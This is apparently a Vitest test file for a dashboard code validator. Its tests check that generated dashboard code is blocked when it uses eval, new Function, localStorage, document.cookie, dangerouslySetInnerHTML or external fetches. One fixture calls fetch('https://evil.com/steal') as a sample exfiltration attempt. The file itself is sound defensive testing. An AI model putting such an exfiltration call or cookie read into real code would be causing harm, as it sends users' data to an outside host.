import { describe, it, expect } from "vitest";
import {
  validateDashboardCode,
  detectCodeType,
} from "@/lib/dashboard/code-validator";

describe("validateDashboardCode", () => {
  it("accepts valid TSX with default export", () => {
    const code = `
export default function Dashboard() {
  return <div>Hello</div>;
}`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(true);
    expect(result.errors).toHaveLength(0);
  });

  it("accepts valid HTML", () => {
    const code = `<div class="p-4"><h1>Dashboard</h1></div>`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(true);
  });

  it("rejects empty code", () => {
    const result = validateDashboardCode("");
    expect(result.valid).toBe(false);
    expect(result.errors).toContain("Empty code");
  });

  it("blocks eval()", () => {
    const code = `export default function Dashboard() { eval("alert(1)"); return <div />; }`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes("eval"))).toBe(true);
  });

  it("blocks new Function()", () => {
    const code = `export default function Dashboard() { new Function("return 1"); return <div />; }`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
  });

  it("blocks localStorage access", () => {
    const code = `export default function Dashboard() { localStorage.setItem("x","y"); return <div />; }`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
  });

  it("blocks document.cookie access", () => {
    const code = `export default function Dashboard() { const c = document.cookie; return <div />; }`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
  });

  it("blocks dangerouslySetInnerHTML", () => {
    const code = `export default function Dashboard() { return <div dangerouslySetInnerHTML={{__html: "x"}} />; }`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
  });

  it("blocks external fetch URLs", () => {
    const code = `export default function Dashboard() { fetch("https://evil.com/steal"); return <div />; }`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(false);
  });

  it("allows local fetch", () => {
    const code = `export default function Dashboard() { fetch("/api/health"); return <div />; }`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(true);
  });

  it("strips markdown fences", () => {
    const code = "```tsx\nexport default function Dashboard() { return <div />; }\n```";
    const result = validateDashboardCode(code);
    expect(result.code).not.toContain("```");
    expect(result.code).toContain("export default");
  });

  it("accepts TSX without default export (HTML-first, no TSX requirement)", () => {
    const code = `function Dashboard() { return <div />; }`;
    const result = validateDashboardCode(code);
    expect(result.valid).toBe(true);
  });
});

describe("detectCodeType", () => {
  it("detects TSX from export default", () => {
    expect(detectCodeType("export default function Dashboard() {}")).toBe("tsx");
  });

  it("detects TSX from import", () => {
    expect(detectCodeType('import React from "react";')).toBe("tsx");
  });

  it("detects TSX from useState", () => {
    expect(detectCodeType("const [x, setX] = useState(0)")).toBe("tsx");
  });

  it("detects HTML without React keywords", () => {
    expect(detectCodeType('<div class="p-4">Hello</div>')).toBe("html");
  });
});
